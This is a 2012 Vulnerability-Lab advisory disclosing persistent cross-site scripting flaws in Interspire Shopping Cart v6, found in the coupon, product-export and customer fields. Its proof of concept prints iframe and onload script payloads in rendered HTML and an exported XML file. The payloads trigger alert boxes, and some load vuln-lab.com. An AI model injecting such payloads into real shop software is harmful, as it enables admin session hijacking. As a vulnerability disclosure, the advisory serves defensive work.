Title:
======
Interspire Shopping Cart v6 - Multiple Web Vulnerabilities


Date:
=====
2012-06-03


References:
===========
http://www.vulnerability-lab.com/get_content.php?id=593


VL-ID:
=====
593


Common Vulnerability Scoring System:
====================================
3.5


Introduction:
=============
Interspire Shopping Cart is the most feature rich, all-in-one shopping cart software available. 
It has an enterprise-grade feature set and is trusted by more than 15,000 businesses in over 65 countries.

Feature Highlights
Completely browser based
Drag & drop layout editor
Fully SEO optimized by experts
Mobile commerce
Min/max order quantity
Easy-to-use store control panel
Multiple logins with permissions
Refunds & store credits
Tabs on product pages
	
Sell your products on eBay
Amazingly flexible tax system
Per-product inventory control
90+ designs included
Easily customize your design
Agree to terms to checkout
Shipping zones & options
Sell in multiple currencies
Gift wrapping & messages

Version 6 includes the ability sell on eBay as well as mobile commerce, Mailchimp integration, shopping 
comparison export, pre-orders, min/max order quantity and more.

(Copy of the Vendor Homepage: http://www.interspire.com/shoppingcart )


Abstract:
=========
The Vulnerability Laboratory Research Team discovered multiple persistent Web vulnerabilities in Interspire Shopping Cart v6 CMS.


Report-Timeline:
================
2012-06-03:	Public or Non-Public Disclosure


Status:
========
Published


Exploitation-Technique:
=======================
Remote


Severity:
=========
Medium


Details:
========
Multiple persistent input validation vulnerabilities are detected in Interspire Shopping Cart v6 Content Management System.
The bugs allow remote attackers to implement/inject malicious script code on the application side (persistent). 
Successful exploitation of the vulnerability can lead to session hijacking (manager/admin) or stable (persistent) 
context manipulation. Exploitation requires low user inter action & privileged user account of the application. 
The persistent vulnerabilities are located in the coupon name, product name & the bound export function but also in the 
password input profile listing. 

Vulnerable Module(s):
                               [+] Marketing > Coupon > Create a Coupon Code > Name
                               [+] Products > Name > STRING > View All > Mark Export these Products > x
                               [+] Customer > Add or Register Customer > Password & Name


Proof of Concept:
=================
The persistent web vulnerabilities can be exploited by remote attackers with privileged user account and low required 
user inter action. For demonstration or reproduce ...


Products > Name > STRING > View All > Mark Export these Products > x

<tr class="GridRow" onmouseover="this.className='GridRowOver'" onmouseout="this.className='GridRow'">
<td style="height: 21px;">29</td>
<td style="height: 21px;">"><iframe src="a" onload='alert("VL")' <<="" td="">
<td style="height: 21px;">"><iframe src=a onload=alert("VL") <</td>
<td style="height: 21px;">$32,432.00</td>
<td style="height: 21px;"><img src="images/tick.gif" alt="tick"/></td>
<td style="height: 21px;"><img src="images/cross.gif" alt="cross"/></td>
</tr>
</table>

Note: 
1. To reproduce the issue you need to add a product with script code in the name value.
2. The you need to mark the product in the products view all listing and try to export it.
3. The persistent code is getting execute when the export website will be open and processing to load the context.

URL: http://shoppingcart.127.0.0.1:8080/inspire/shop/admin/index.php?ToDo=startExport&t=products


Marketing > Coupon > Create a Coupon Code > Name

<div class="MessageBox MessageBoxError">
A coupon with the name '"><iframe src="http://vuln-lab.com" onload='alert("VL")' <'="" already="" 
exists.="" <="" div="">
<p><input type="submit" name="SubmitButton1" value="Save" class="FormButton">  
<input type="button" name="CancelButton1" value="Cancel" class="FormButton" onclick="ConfirmCancel()"></p>
</td>

URL: http://shoppingcart.127.0.0.1:8080/inspire/shop/admin/index.php?ToDo=createCoupon2


Customer > Add or Register Customer > Password & Name

<tr>
<td class="FieldLabel">
<span class="Required">*</span> Confirm Password:
</td>
<td><input id="custPasswordConfirm" name="custPasswordConfirm" class="Field250" 
value="" type="password"><iframe src="http://vuln-lab.com" onload='alert("VL")' <"="" autocomplete="OFF">

... exported .xml

<?xml version="1.0" encoding="UTF-8"?>
<customers>
<customer>
<Customer_ID><![CDATA[31]]></Customer_ID>
<First_Name><![CDATA["><iframe src=a onload=alert("VL") <]]></First_Name>
<Last_Name><![CDATA["><iframe src=a onload=alert("VL") <]]></Last_Name>
<Company><![CDATA[TEST]]></Company>
<Customer_E-mail><![CDATA[darius@aol.de]]></Customer_E-mail>
<Telephone_1><![CDATA[0713273632]]></Telephone_1>
<Notes><![CDATA["><iframe src=a onload=alert("VL") <]]></Notes>
<Customer_Balance><![CDATA[324325.00]]></Customer_Balance>
<Customer_Group><![CDATA[]]></Customer_Group>
<Customer_Since_Date><![CDATA[02/06/2012]]></Customer_Since_Date>
<Addresses>
<item>
<Address_First_Name><![CDATA["><iframe src=http://vuln-lab.com onload=alert("VL") <]]></Address_First_Name>
<Address_Last_Name><![CDATA["><iframe src=http://vuln-lab.com onload=alert("VL") <]]></Address_Last_Name>
<Address_Company><![CDATA[TEST]]></Address_Company>
<Address_Line_1><![CDATA[TEST]]></Address_Line_1>
<Address_Line_2><![CDATA[TEST]]></Address_Line_2>
<City><![CDATA[TEST]]></City>
<State><![CDATA[TEST]]></State>
<Zip><![CDATA[124325]]></Zip>
<Country><![CDATA[Tuvalu]]></Country>
<Address_Phone><![CDATA[0345435]]></Address_Phone>
</item>
</Addresses>
</customer>
</customers>


Risk:
=====
The security risk of the persistent input validation vulnerabilities are estimated as medium.


Credits:
========
Vulnerability Laboratory [Research Team]  -    Benjamin Kunz Mejri (bkm@vulnerability-lab.com)


Disclaimer:
===========
The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties, 
either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-
Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business 
profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some 
states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation 
may not apply.

Domains:	www.vulnerability-lab.com   - www.vuln-lab.com
Section:	video.vulnerability-lab.com - forum.vulnerability-lab.com - news.vulnerability-lab.com
Contact:	admin@vulnerability-lab.com - support@vulnerability-lab.com - irc.vulnerability-lab.com

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. 
Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of 
other media, are reserved by Vulnerability-Lab Research Team or its suppliers.

    						Copyright © 2012 Vulnerability-Lab




-- 
VULNERABILITY RESEARCH LABORATORY TEAM
Website: www.vulnerability-lab.com
Mail: research@vulnerability-lab.com

